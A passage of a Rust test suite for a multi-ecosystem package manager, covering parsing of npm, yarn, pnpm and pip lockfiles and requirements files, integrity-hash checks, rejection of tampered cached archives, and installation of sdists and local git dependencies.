                "sha512-FGl0QHAcOIX3yNX6pZ8za0ccqGMyA07/DT/dwC3JsYuDVuhA21SCPI/S8svQkGlpzxMs+Lucc9x2m0/9gXvSPQ=="
            )
        );
        assert_eq!(
            requirements
                .npm_integrities
                .get("npm:legacy")
                .and_then(|values| values.iter().next())
                .map(String::as_str),
            Some("sha1-Hl3LtZt1PLHUbiNNj2GAKFuLhq0=")
        );
        assert!(!requirements.npm_integrities.contains_key("npm:dup"));
    }

    #[test]
    fn reads_package_lock_resolved_urls_for_unique_versions() {
        let dir = tempfile::tempdir().unwrap();
        let package_lock = dir.path().join("package-lock.json");
        fs::write(
            &package_lock,
            r#"{
                "lockfileVersion": 3,
                "packages": {
                    "": { "name": "demo", "version": "0.1.0" },
                    "node_modules/is-odd": {
                        "version": "3.0.1",
                        "resolved": "https://registry.example.invalid/is-odd-3.0.1.tgz"
                    },
                    "node_modules/a/node_modules/dup": {
                        "version": "1.0.0",
                        "resolved": "https://registry.example.invalid/dup-1.0.0.tgz"
                    },
                    "node_modules/b/node_modules/dup": {
                        "version": "2.0.0",
                        "resolved": "https://registry.example.invalid/dup-2.0.0.tgz"
                    }
                },
                "dependencies": {
                    "legacy": {
                        "version": "4.0.0",
                        "resolved": "https://registry.example.invalid/legacy-4.0.0.tgz"
                    }
                }
            }"#,
        )
        .unwrap();

        let requirements = read_package_lock_requirements(&package_lock).unwrap();
        assert_eq!(
            requirements
                .npm_resolved
                .get("npm:is-odd")
                .map(String::as_str),
            Some("https://registry.example.invalid/is-odd-3.0.1.tgz")
        );
        assert_eq!(
            requirements
                .npm_resolved
                .get("npm:legacy")
                .map(String::as_str),
            Some("https://registry.example.invalid/legacy-4.0.0.tgz")
        );
        assert!(!requirements.npm_resolved.contains_key("npm:dup"));
    }

    #[test]
    fn reads_yarn_lock_constraints_integrities_and_urls() {
        let dir = tempfile::tempdir().unwrap();
        let yarn_lock = dir.path().join("yarn.lock");
        fs::write(
            &yarn_lock,
            r#"# yarn lockfile v1

left-pad@^1.0.0, "left-pad@~1.1.0":
  version "1.1.3"
  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-1.1.3.tgz#612f61c0f5c20ba82e3d8f3f211f98d7bc86dca5"
  integrity sha512-leftpad

"@scope/pkg@^1.0.0":
  version "1.2.3"
  resolved "https://registry.yarnpkg.com/@scope/pkg/-/pkg-1.2.3.tgz"

"alias@npm:real-name@^3.0.0":
  version "3.1.0"

dup@^1.0.0:
  version "1.0.0"

dup@^2.0.0:
  version "2.0.0"
"#,
        )
        .unwrap();

        let requirements = read_yarn_lock_requirements(&yarn_lock).unwrap();
        assert_eq!(
            requirements
                .constraints
                .get("npm:left-pad")
                .map(String::as_str),
            Some("1.1.3")
        );
        assert_eq!(
            requirements
                .constraints
                .get("npm:@scope/pkg")
                .map(String::as_str),
            Some("1.2.3")
        );
        assert_eq!(
            requirements
                .constraints
                .get("npm:alias")
                .map(String::as_str),
            Some("3.1.0")
        );
        assert_eq!(
            requirements
                .npm_integrities
                .get("npm:left-pad")
                .and_then(|values| values.iter().next())
                .map(String::as_str),
            Some("sha512-leftpad")
        );
        assert_eq!(
            requirements
                .npm_resolved
                .get("npm:left-pad")
                .map(String::as_str),
            Some(
                "https://registry.yarnpkg.com/left-pad/-/left-pad-1.1.3.tgz#612f61c0f5c20ba82e3d8f3f211f98d7bc86dca5"
            )
        );
        assert!(!requirements.constraints.contains_key("npm:dup"));
        assert!(!requirements.npm_resolved.contains_key("npm:dup"));
    }

    #[test]
    fn discovers_yarn_lock_constraints() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("package.json"),
            r#"{ "dependencies": { "left-pad": "^1.0.0" } }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("yarn.lock"),
            r#"left-pad@^1.0.0:
  version "1.1.3"
  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-1.1.3.tgz"
"#,
        )
        .unwrap();

        let discovered = discover_project_requirements(dir.path()).unwrap();
        assert!(discovered
            .specs
            .iter()
            .any(|spec| spec.name == "left-pad" && spec.version.as_deref() == Some("^1.0.0")));
        assert_eq!(
            discovered
                .constraints
                .get("npm:left-pad")
                .map(String::as_str),
            Some("1.1.3")
        );
        assert_eq!(
            discovered
                .npm_resolved
                .get("npm:left-pad")
                .map(String::as_str),
            Some("https://registry.yarnpkg.com/left-pad/-/left-pad-1.1.3.tgz")
        );
    }

    #[test]
    fn reads_pnpm_lock_constraints_integrities_urls_and_importers() {
        let dir = tempfile::tempdir().unwrap();
        let pnpm_lock = dir.path().join("pnpm-lock.yaml");
        fs::write(
            &pnpm_lock,
            r#"lockfileVersion: '9.0'

importers:
  .:
    dependencies:
      left-pad:
        specifier: ^1.0.0
        version: 1.1.3
    optionalDependencies:
      is-even:
        specifier: ^1.0.0
        version: 1.0.0
    devDependencies:
      which:
        specifier: ^2.0.0
        version: 2.0.2

packages:
  left-pad@1.1.3:
    resolution:
      integrity: sha512-leftpad
      tarball: https://registry.example.invalid/left-pad-1.1.3.tgz
  is-even@1.0.0:
    resolution:
      integrity: sha512-iseven
  which@2.0.2:
    resolution:
      integrity: sha512-which
  dup@1.0.0:
    resolution:
      integrity: sha512-one
  dup@2.0.0:
    resolution:
      integrity: sha512-two
"#,
        )
        .unwrap();

        let production = read_pnpm_lock_requirements(&pnpm_lock, false).unwrap();
        assert!(has_spec(&production.specs, "left-pad", "1.1.3"));
        assert!(has_spec(&production.specs, "is-even", "1.0.0"));
        assert!(!production.specs.iter().any(|spec| spec.name == "which"));
        assert_eq!(
            production
                .constraints
                .get("npm:left-pad")
                .map(String::as_str),
            Some("1.1.3")
        );
        assert_eq!(
            production
                .npm_integrities
                .get("npm:left-pad")
                .and_then(|integrities| integrities.iter().next())
                .map(String::as_str),
            Some("sha512-leftpad")
        );
        assert_eq!(
            production
                .npm_resolved
                .get("npm:left-pad")
                .map(String::as_str),
            Some("https://registry.example.invalid/left-pad-1.1.3.tgz")
        );
        assert!(!production.constraints.contains_key("npm:dup"));

        let dev = read_pnpm_lock_requirements(&pnpm_lock, true).unwrap();
        assert!(has_spec(&dev.specs, "which", "2.0.2"));
    }

    #[test]
    fn discovers_pnpm_lock_requirements() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("pnpm-lock.yaml"),
            r#"lockfileVersion: '9.0'
importers:
  .:
    dependencies:
      left-pad:
        specifier: ^1.0.0
        version: 1.1.3
packages:
  left-pad@1.1.3:
    resolution: {}
"#,
        )
        .unwrap();

        let discovered = discover_project_requirements(dir.path()).unwrap();
        assert!(has_spec(&discovered.specs, "left-pad", "1.1.3"));
        assert_eq!(
            discovered
                .constraints
                .get("npm:left-pad")
                .map(String::as_str),
            Some("1.1.3")
        );
    }

    #[test]
    fn resolves_npm_from_lockfile_tarball_url() {
        let mut options = LinkOptions::new(".");
        options
            .constraints
            .insert("npm:left-pad".to_owned(), "1.3.0".to_owned());
        options.npm_resolved.insert(
            "npm:left-pad".to_owned(),
            "https://registry.example.invalid/left-pad-1.3.0.tgz?lock=1".to_owned(),
        );
        let spec = PackageSpec::parse("npm:left-pad@^1.0.0").unwrap();
        let resolved = resolve_npm_lockfile_tarball(&spec, "left-pad", Some("^1.0.0"), &options)
            .unwrap()
            .unwrap();

        assert!(resolved.npm_direct_tarball);
        assert_eq!(
            resolved.source_url,
            "https://registry.example.invalid/left-pad-1.3.0.tgz?lock=1"
        );
        assert_eq!(resolved.version, "1.3.0");
    }

    #[test]
    fn extracts_npm_manifest_from_tgz() {
        let bytes = npm_tgz_for_test(
            r#"{
                "name": "pkg",
                "version": "1.0.0",
                "scripts": { "postinstall": "node install.js" },
                "dependencies": { "runtime": "^1.0.0" },
                "peerDependencies": { "peer": "^2.0.0" }
            }"#,
        );

        let manifest = npm_manifest_from_tgz(&bytes).unwrap();
        assert_eq!(manifest.version, "1.0.0");
        assert_eq!(
            manifest
                .scripts
                .as_ref()
                .and_then(|scripts| scripts.get("postinstall"))
                .map(String::as_str),
            Some("node install.js")
        );
        let dependencies = npm_manifest_runtime_dependencies(&manifest);
        assert!(dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "runtime"));
        assert!(dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "peer"));
    }

    #[test]
    fn verifies_npm_integrity_hashes() {
        let bytes = b"artifact";
        assert!(verify_npm_integrity(
            "demo",
            "sha512-FGl0QHAcOIX3yNX6pZ8za0ccqGMyA07/DT/dwC3JsYuDVuhA21SCPI/S8svQkGlpzxMs+Lucc9x2m0/9gXvSPQ==",
            bytes,
        )
        .is_ok());
        assert!(verify_npm_integrity("demo", "sha1-Hl3LtZt1PLHUbiNNj2GAKFuLhq0=", bytes).is_ok());

        let error = verify_npm_integrity("demo", "sha512-AAAA", bytes).unwrap_err();
        assert!(matches!(error, OmcRegistryError::DigestMismatch { .. }));

        let error = verify_npm_integrity("demo", "md5-AAAA", bytes).unwrap_err();
        assert!(error
            .to_string()
            .contains("unsupported npm integrity digest"));
    }

    #[test]
    fn prunes_lockfile_to_retained_packages() {
        let dir = tempfile::tempdir().unwrap();
        let keep = locked_package_for_test(Ecosystem::Npm, "left-pad", "1.3.0");
        let stale = locked_package_for_test(Ecosystem::Npm, "is-odd", "3.0.1");
        fs::write(
            dir.path().join("omc.lock"),
            toml::to_string_pretty(&OmcLock {
                version: 1,
                packages: vec![keep.clone(), stale],
                python_vcs: Vec::new(),
            })
            .unwrap(),
        )
        .unwrap();

        let removed =
            prune_lockfile(dir.path(), &BTreeSet::from([locked_package_key(&keep)])).unwrap();

        let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
        assert_eq!(removed, 1);
        assert_eq!(lock.packages.len(), 1);
        assert_eq!(lock.packages[0].name, "left-pad");
    }

    #[test]
    fn locked_archive_reader_rejects_tampered_cache() {
        let dir = tempfile::tempdir().unwrap();
        let archive = dir.path().join(".omc/cache/npm/pkg.tgz");
        fs::create_dir_all(archive.parent().unwrap()).unwrap();
        fs::write(&archive, b"tampered").unwrap();

        let mut package = locked_package_for_test(Ecosystem::Npm, "pkg", "1.0.0");
        package.archive = ".omc/cache/npm/pkg.tgz".to_owned();
        package.sha256 = sha256_hex(b"expected");

        let error = read_locked_archive(dir.path(), &package).unwrap_err();
        assert!(matches!(error, OmcRegistryError::DigestMismatch { .. }));

        package.sha256 = sha256_hex(b"tampered");
        assert_eq!(
            read_locked_archive(dir.path(), &package).unwrap(),
            b"tampered"
        );
    }

    #[test]
    fn installs_npm_tarballs_with_root_directory_entries() {
        let dir = tempfile::tempdir().unwrap();
        let bytes = npm_tgz_for_test(
            r#"{
                "name": "pkg",
                "version": "1.0.0"
            }"#,
        );
        let archive = dir.path().join(".omc/cache/npm/pkg.tgz");
        fs::create_dir_all(archive.parent().unwrap()).unwrap();
        fs::write(&archive, &bytes).unwrap();

        let mut package = locked_package_for_test(Ecosystem::Npm, "pkg", "1.0.0");
        package.archive = relative_path(dir.path(), &archive);
        package.sha256 = sha256_hex(&bytes);

        let node_modules = dir.path().join("node_modules");
        let target = install_npm_package_to(dir.path(), &package, &node_modules).unwrap();
        assert!(target.join("package.json").exists());
    }

    #[test]
    fn locked_reachable_packages_include_transitive_dependencies() {
        let mut root = locked_package_for_test(Ecosystem::Npm, "is-odd", "3.0.1");
        root.dependencies = vec!["npm:is-number@^6.0.0".to_owned()];
        let dependency = locked_package_for_test(Ecosystem::Npm, "is-number", "6.0.0");
        let lock = OmcLock {
            version: 1,
            packages: vec![root, dependency],
            python_vcs: Vec::new(),
        };
        let options = LinkOptions::new(".");
        let retained = locked_reachable_package_keys(
            &lock,
            &[PackageSpec::parse("npm:is-odd@^3.0.0").unwrap()],
            &options,
        )
        .unwrap();

        assert!(retained.contains("npm:is-odd@3.0.1"));
        assert!(retained.contains("npm:is-number@6.0.0"));
    }

    #[test]
    fn locked_reachable_packages_allow_missing_optional_dependencies() {
        let mut root = locked_package_for_test(Ecosystem::Npm, "has-optional", "1.0.0");
        root.optional_dependencies = vec!["npm:optional-platform@1.0.0".to_owned()];
        let lock = OmcLock {
            version: 1,
            packages: vec![root],
            python_vcs: Vec::new(),
        };
        let options = LinkOptions::new(".");
        let retained = locked_reachable_package_keys(
            &lock,
            &[PackageSpec::parse("npm:has-optional@1.0.0").unwrap()],
            &options,
        )
        .unwrap();

        assert_eq!(
            retained,
            BTreeSet::from(["npm:has-optional@1.0.0".to_owned()])
        );
    }

    #[test]
    fn locked_reachable_packages_reject_stale_lockfiles() {
        let lock = OmcLock {
            version: 1,
            packages: vec![locked_package_for_test(Ecosystem::Npm, "left-pad", "1.1.0")],
            python_vcs: Vec::new(),
        };
        let options = LinkOptions::new(".");
        let error = locked_reachable_package_keys(
            &lock,
            &[PackageSpec::parse("npm:left-pad@1.3.0").unwrap()],
            &options,
        )
        .unwrap_err();

        assert!(matches!(error, OmcRegistryError::LockfileOutOfDate(_)));
    }

    #[test]
    fn discovers_package_lock_constraints() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("package.json"),
            r#"{ "dependencies": { "left-pad": "^1.1.0" } }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("package-lock.json"),
            r#"{
                "lockfileVersion": 3,
                "packages": {
                    "": { "name": "demo", "version": "0.1.0" },
                    "node_modules/left-pad": { "version": "1.1.3" }
                }
            }"#,
        )
        .unwrap();

        let discovered = discover_project_requirements(dir.path()).unwrap();
        assert!(discovered
            .specs
            .iter()
            .any(|spec| spec.name == "left-pad" && spec.version.as_deref() == Some("^1.1.0")));
        assert_eq!(
            discovered
                .constraints
                .get("npm:left-pad")
                .map(String::as_str),
            Some("1.1.3")
        );
    }

    #[test]
    fn discovers_npm_shrinkwrap_constraints() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("package.json"),
            r#"{ "dependencies": { "left-pad": "^1.1.0" } }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("npm-shrinkwrap.json"),
            r#"{
                "lockfileVersion": 3,
                "packages": {
                    "": { "name": "demo", "version": "0.1.0" },
                    "node_modules/left-pad": {
                        "version": "1.1.3",
                        "resolved": "https://registry.example.invalid/left-pad-1.1.3.tgz",
                        "integrity": "sha512-leftpad"
                    }
                }
            }"#,
        )
        .unwrap();

        let discovered = discover_project_requirements(dir.path()).unwrap();
        assert_eq!(
            discovered
                .constraints
                .get("npm:left-pad")
                .map(String::as_str),
            Some("1.1.3")
        );
        assert_eq!(
            discovered
                .npm_resolved
                .get("npm:left-pad")
                .map(String::as_str),
            Some("https://registry.example.invalid/left-pad-1.1.3.tgz")
        );
        assert_eq!(
            discovered
                .npm_integrities
                .get("npm:left-pad")
                .and_then(|integrities| integrities.iter().next())
                .map(String::as_str),
            Some("sha512-leftpad")
        );
    }

    #[test]
    fn merges_npm_lock_constraints_into_ranges_and_aliases() {
        let spec = PackageSpec::new(Ecosystem::Npm, "is-odd", Some("^3.0.0".to_owned()));
        let constraints = BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())]);
        assert_eq!(
            constrained_npm_requirement(&spec, spec.version.as_deref(), &constraints).as_deref(),
            Some("^3.0.0,3.0.1")
        );

        let alias = PackageSpec::new(
            Ecosystem::Npm,
            "string-width-cjs",
            Some("npm:string-width@^4.2.0".to_owned()),
        );
        let (_, alias_requirement) = npm_registry_name_and_requirement(&alias).unwrap();
        assert_eq!(
            constrained_npm_requirement(&alias, alias_requirement.as_deref(), &BTreeMap::new())
                .as_deref(),
            Some("^4.2.0")
        );
    }

    #[test]
    fn reads_requirements_specs() {
        let dir = tempfile::tempdir().unwrap();
        let requirements = dir.path().join("requirements.txt");
        let nested = dir.path().join("nested.txt");
        let constraints = dir.path().join("constraints.txt");
        fs::write(&nested, "charset-normalizer==3.4.0\n").unwrap();
        fs::write(&constraints, "urllib3==2.2.1\n").unwrap();
        fs::write(
            &requirements,
            "requests[socks]==2.32.3 \\\n  --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n# ignored\nidna>=2,<4\n-r nested.txt\n-c constraints.txt\ncolorama; extra == 'windows'\n",
        )
        .unwrap();
        let discovered = read_requirements_file(&requirements).unwrap();
        let specs = discovered.specs;
        assert!(specs.iter().any(|spec| spec.name == "requests"
            && spec.version.as_deref() == Some("==2.32.3")
            && spec.extras.contains("socks")));
        assert!(specs
            .iter()
            .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some(">=2,<4")));
        assert!(specs
            .iter()
            .any(|spec| spec.name == "charset-normalizer"
                && spec.version.as_deref() == Some("==3.4.0")));
        assert!(!specs.iter().any(|spec| spec.name == "colorama"));
        assert_eq!(specs.len(), 3);
        assert_eq!(
            discovered
                .constraints
                .get("pypi:urllib3")
                .map(String::as_str),
            Some("==2.2.1")
        );
        assert_eq!(
            discovered
                .hashes
                .get("pypi:requests")
                .and_then(|hashes| hashes.iter().next())
                .map(String::as_str),
            Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
        );
    }

    #[test]
    fn discovers_dev_requirements_files_respecting_omit_dev() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("requirements.txt"), "idna==3.7\n").unwrap();
        fs::write(
            dir.path().join("requirements-dev.txt"),
            "-r requirements.txt\npytest==8.2.0\n",
        )
        .unwrap();
        fs::write(dir.path().join("dev-requirements.txt"), "ruff==0.5.0\n").unwrap();

        let production =
            discover_project_requirements_with_options(dir.path(), &BTreeSet::new(), false)
                .unwrap();
        assert!(has_spec(&production.specs, "idna", "==3.7"));
        assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));
        assert!(!production.specs.iter().any(|spec| spec.name == "ruff"));

        let dev = discover_project_requirements(dir.path()).unwrap();
        assert!(has_spec(&dev.specs, "idna", "==3.7"));
        assert!(has_spec(&dev.specs, "pytest", "==8.2.0"));
        assert!(has_spec(&dev.specs, "ruff", "==0.5.0"));
        assert_eq!(
            dev.specs.iter().filter(|spec| spec.name == "idna").count(),
            1
        );
    }

    #[test]
    fn discovers_requirements_directory_layout() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("requirements")).unwrap();
        fs::write(
            dir.path().join("requirements").join("base.txt"),
            "idna==3.7\n",
        )
        .unwrap();
        fs::write(
            dir.path().join("requirements").join("dev.txt"),
            "-r base.txt\npytest==8.2.0\n",
        )
        .unwrap();

        let production =
            discover_project_requirements_with_options(dir.path(), &BTreeSet::new(), false)
                .unwrap();
        assert!(has_spec(&production.specs, "idna", "==3.7"));
        assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));

        let dev = discover_project_requirements(dir.path()).unwrap();
        assert!(has_spec(&dev.specs, "idna", "==3.7"));
        assert!(has_spec(&dev.specs, "pytest", "==8.2.0"));
        assert_eq!(
            dev.specs.iter().filter(|spec| spec.name == "idna").count(),
            1
        );
    }

    #[test]
    fn installs_explicit_requirement_files() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("requirements")).unwrap();
        let local = dir.path().join("vendor").join("localpkg");
        let src = local.join("src");
        fs::create_dir_all(src.join("localpkg")).unwrap();
        fs::write(
            src.join("localpkg").join("__init__.py"),
            "VALUE = 'explicit'\n",
        )
        .unwrap();
        fs::write(
            dir.path().join("requirements").join("prod.txt"),
            "-e ../vendor/localpkg\n",
        )
        .unwrap();

        let mut options = LinkOptions::new(dir.path());
        options
            .requirement_files
            .push(dir.path().join("requirements").join("prod.txt"));
        let report = install_project(&options).unwrap();
        assert_eq!(report.pypi_packages, 0);

        let local_paths =
            fs::read_to_string(dir.path().join(".omc").join("python").join("local-paths")).unwrap();
        assert_eq!(
            local_paths.trim(),
            fs::canonicalize(src).unwrap().to_string_lossy()
        );
    }

    #[test]
    fn applies_explicit_constraint_files() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("requirements.txt"), "idna>=2\n").unwrap();
        fs::write(dir.path().join("constraints.txt"), "idna==3.7\n").unwrap();

        let mut options = LinkOptions::new(dir.path());
        options
            .requirement_files
            .push(dir.path().join("requirements.txt"));
        options
            .constraint_files
            .push(dir.path().join("constraints.txt"));
        let specs = project_requested_specs(&mut options, false).unwrap();

        assert!(specs
            .iter()
            .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some(">=2")));
        assert_eq!(
            options.constraints.get("pypi:idna").map(String::as_str),
            Some("==3.7")
        );
    }

    #[test]
    fn installs_pure_python_sdist_archives() {
        let dir = tempfile::tempdir().unwrap();
        let bytes = python_sdist_for_test(&[
            (
                "pyproject.toml",
                r#"
                [project]
                name = "pure-sdist"
                version = "1.0.0"

                [project.scripts]
                pure-sdist-cli = "puresdist.cli:main"
                "#,
            ),
            ("src/puresdist/__init__.py", "VALUE = 'sdist-ok'\n"),
            (
                "src/puresdist/cli.py",
                "from puresdist import VALUE\n\ndef main():\n    print(VALUE)\n",
            ),
        ]);
        let archive = dir
            .path()
            .join(".omc")
            .join("cache")
            .join("pure-sdist-1.0.0.tar.gz");
        fs::create_dir_all(archive.parent().unwrap()).unwrap();
        fs::write(&archive, &bytes).unwrap();

        let mut package = locked_package_for_test(Ecosystem::Pypi, "pure-sdist", "1.0.0");
        package.source_url = "https://example.invalid/pure-sdist-1.0.0.tar.gz".to_owned();
        package.archive = relative_path(dir.path(), &archive);
        package.sha256 = sha256_hex(&bytes);
        write_signed_artifact_for_test(dir.path(), &package);

        let report = install_lock(
            dir.path(),
            &OmcLock {
                version: 1,
                packages: vec![package],
                python_vcs: Vec::new(),
            },
        )
        .unwrap();
        assert_eq!(report.pypi_packages, 1);
        assert!(dir
            .path()
            .join(".omc/python/site-packages/puresdist/__init__.py")
            .exists());

        let output = Command::new(dir.path().join(".omc/python/bin/pure-sdist-cli"))
            .output()
            .unwrap();
        assert!(output.status.success());
        assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "sdist-ok");
    }

    #[test]
    fn installs_pure_python_zip_sdist_archives() {
        let dir = tempfile::tempdir().unwrap();
        let bytes = python_zip_sdist_for_test(&[
            (
                "pyproject.toml",
                r#"
                [project]
                name = "pure-sdist"
                version = "1.0.0"

                [project.scripts]
                pure-sdist-cli = "puresdist.cli:main"
                "#,
            ),
            ("src/puresdist/__init__.py", "VALUE = 'zip-sdist-ok'\n"),
            (
                "src/puresdist/cli.py",
                "from puresdist import VALUE\n\ndef main():\n    print(VALUE)\n",
            ),
        ]);
        let archive = dir
            .path()
            .join(".omc")
            .join("cache")
            .join("pure-sdist-1.0.0.zip");
        fs::create_dir_all(archive.parent().unwrap()).unwrap();
        fs::write(&archive, &bytes).unwrap();

        let mut package = locked_package_for_test(Ecosystem::Pypi, "pure-sdist", "1.0.0");
        package.source_url = "https://example.invalid/pure-sdist-1.0.0.zip".to_owned();
        package.archive = relative_path(dir.path(), &archive);
        package.sha256 = sha256_hex(&bytes);
        write_signed_artifact_for_test(dir.path(), &package);

        let report = install_lock(
            dir.path(),
            &OmcLock {
                version: 1,
                packages: vec![package],
                python_vcs: Vec::new(),
            },
        )
        .unwrap();
        assert_eq!(report.pypi_packages, 1);

        let output = Command::new(dir.path().join(".omc/python/bin/pure-sdist-cli"))
            .output()
            .unwrap();
        assert!(output.status.success());
        assert_eq!(
            String::from_utf8_lossy(&output.stdout).trim(),
            "zip-sdist-ok"
        );
    }

    #[test]
    fn reads_requirements_local_editable_paths() {
        let dir = tempfile::tempdir().unwrap();
        let requirements = dir.path().join("requirements.txt");
        fs::write(&requirements, "-e .\n--editable ./vendor/pkg[dev]\n").unwrap();

        let discovered = read_requirements_file(&requirements).unwrap();
        assert_eq!(
            discovered.python_local_paths,
            vec![dir.path().join("."), dir.path().join("./vendor/pkg")]
        );

        let project = discover_project_requirements(dir.path()).unwrap();
        assert_eq!(project.python_local_paths, discovered.python_local_paths);
    }

    #[test]
    fn reads_requirements_local_direct_paths() {
        let dir = tempfile::tempdir().unwrap();
        let requirements = dir.path().join("requirements.txt");
        let local_pkg = dir.path().join("vendor/local-pkg");
        let file_url_pkg = dir.path().join("vendor/file-url-pkg");
        let bare_pkg = dir.path().join("vendor/bare-pkg");
        fs::create_dir_all(&local_pkg).unwrap();
        fs::create_dir_all(&file_url_pkg).unwrap();
        fs::create_dir_all(&bare_pkg).unwrap();
        let file_url = reqwest::Url::from_directory_path(&file_url_pkg)
            .unwrap()
            .to_string();
        fs::write(
            &requirements,
            format!(
                "local-pkg @ ./vendor/local-pkg\nfile-url-pkg @ {file_url}\n./vendor/bare-pkg[dev]\n./missing-bare; sys_platform == 'win32'\nskipped-local @ ./missing; sys_platform == 'win32'\n"
            ),
        )
        .unwrap();

        let discovered = read_requirements_file(&requirements).unwrap();
        assert_eq!(
            discovered.python_local_paths,
            vec![local_pkg, file_url_pkg, bare_pkg]
        );

        let project = discover_project_requirements(dir.path()).unwrap();
        assert_eq!(project.python_local_paths, discovered.python_local_paths);
    }

    #[test]
    fn reads_requirements_vcs_dependencies() {
        let dir = tempfile::tempdir().unwrap();
        let requirements = dir.path().join("requirements.txt");
        let repo_url = reqwest::Url::from_directory_path(dir.path().join("repo"))
            .unwrap()
            .to_string();
        fs::write(
            &requirements,
            format!(
                "-e git+{repo_url}@v1#egg=demo[cli]&subdirectory=src\nother[http] @ git+{repo_url}@main#subdirectory=package\ngit+{repo_url}@release#egg=bare&subdirectory=barepkg; python_version >= '3'\n"
            ),
        )
        .unwrap();
        let discovered = read_requirements_file(&requirements).unwrap();
        assert!(discovered.specs.is_empty());
        assert!(discovered.python_local_paths.is_empty());
        assert_eq!(discovered.python_vcs_requirements.len(), 3);

        let editable = &discovered.python_vcs_requirements[0];
        assert_eq!(editable.name, "demo");
        assert_eq!(editable.url, repo_url);
        assert_eq!(editable.reference.as_deref(), Some("v1"));
        assert_eq!(editable.subdirectory.as_deref(), Some(Path::new("src")));
        assert_eq!(editable.extras, BTreeSet::from(["cli".to_owned()]));

        let direct = &discovered.python_vcs_requirements[1];
        assert_eq!(direct.name, "other");
        assert_eq!(direct.reference.as_deref(), Some("main"));
        assert_eq!(direct.subdirectory.as_deref(), Some(Path::new("package")));
        assert_eq!(direct.extras, BTreeSet::from(["http".to_owned()]));

        let bare = &discovered.python_vcs_requirements[2];
        assert_eq!(bare.name, "bare");
        assert_eq!(bare.reference.as_deref(), Some("release"));
        assert_eq!(bare.subdirectory.as_deref(), Some(Path::new("barepkg")));
    }

    #[test]
    fn installs_python_vcs_requirement_as_local_path() {
        let dir = tempfile::tempdir().unwrap();
        let repo = dir.path().join("gitpkg-repo");
        let src = repo.join("src").join("gitpkg");
        fs::create_dir_all(&src).unwrap();
        fs::write(src.join("__init__.py"), "").unwrap();
        fs::write(src.join("cli.py"), "def main():\n    print('git-vcs-ok')\n").unwrap();
        fs::write(
            repo.join("pyproject.toml"),
            r#"
            [project]
            name = "gitpkg"

            [project.scripts]
            git-vcs-cli = "gitpkg.cli:main"
            "#,
        )
        .unwrap();
        commit_git_repo(&repo);

        let project = dir.path().join("project");
        fs::create_dir_all(&project).unwrap();
        let repo_url = reqwest::Url::from_directory_path(&repo)
            .unwrap()
            .to_string();
        fs::write(
            project.join("requirements.txt"),
            format!("gitpkg @ git+{repo_url}@HEAD\n"),
        )
        .unwrap();

        let requirements =
            discover_project_requirements_with_options(&project, &BTreeSet::new(), false).unwrap();
        assert_eq!(requirements.python_vcs_requirements.len(), 1);

        let report = install_project(&LinkOptions::new(&project)).unwrap();
        assert_eq!(report.python_scripts, 1);
        let lock = read_lockfile(project.join("omc.lock")).unwrap();
        assert_eq!(lock.python_vcs.len(), 1);
        assert_eq!(lock.python_vcs[0].name, "gitpkg");
        assert_eq!(lock.python_vcs[0].reference.as_deref(), Some("HEAD"));
        assert!(is_git_commit_hash(&lock.python_vcs[0].resolved_commit));
        assert!(lock.python_vcs[0].archive.ends_with(".tar.gz"));
        assert!(project.join(&lock.python_vcs[0].archive).exists());
        assert_eq!(lock.python_vcs[0].sha256.len(), 64);
        let local_paths = fs::read_to_string(project.join(".omc/python/local-paths")).unwrap();
        assert!(local_paths.contains(".omc/python/vcs/gitpkg/"));

        let output = Command::new(project.join(".omc/python/bin/git-vcs-cli"))
            .output()
            .unwrap();
        assert!(output.status.success());
        assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "git-vcs-ok");
    }

    #[test]
    fn locked_python_vcs_install_uses_pinned_commit() {
        let dir = tempfile::tempdir().unwrap();
        let repo = dir.path().join("gitpkg-repo");
        let src = repo.join("src").join("gitpkg");
        fs::create_dir_all(&src).unwrap();
        fs::write(src.join("__init__.py"), "").unwrap();
        fs::write(src.join("cli.py"), "def main():\n    print('v1')\n").unwrap();
        fs::write(
            repo.join("pyproject.toml"),
            r#"
            [project]
            name = "gitpkg"

            [project.scripts]
            git-vcs-cli = "gitpkg.cli:main"
            "#,
        )
        .unwrap();
        commit_git_repo(&repo);
        let first_commit = git_rev_parse_head(&repo, "gitpkg").unwrap();

        let project = dir.path().join("project");
        fs::create_dir_all(&project).unwrap();
        let repo_url = reqwest::Url::from_directory_path(&repo)
            .unwrap()
            .to_string();
        fs::write(
            project.join("requirements.txt"),
            format!("gitpkg @ git+{repo_url}@HEAD\n"),
        )
        .unwrap();

        install_project(&LinkOptions::new(&project)).unwrap();
        let lock = read_lockfile(project.join("omc.lock")).unwrap();
        assert_eq!(lock.python_vcs.len(), 1);
        assert_eq!(lock.python_vcs[0].resolved_commit, first_commit);

        fs::write(src.join("cli.py"), "def main():\n    print('v2')\n").unwrap();
        assert!(Command::new("git")
            .arg("-C")
            .arg(&repo)
            .arg("add")
            .arg(".")
            .status()
            .unwrap()
            .success());
        assert!(Command::new("git")
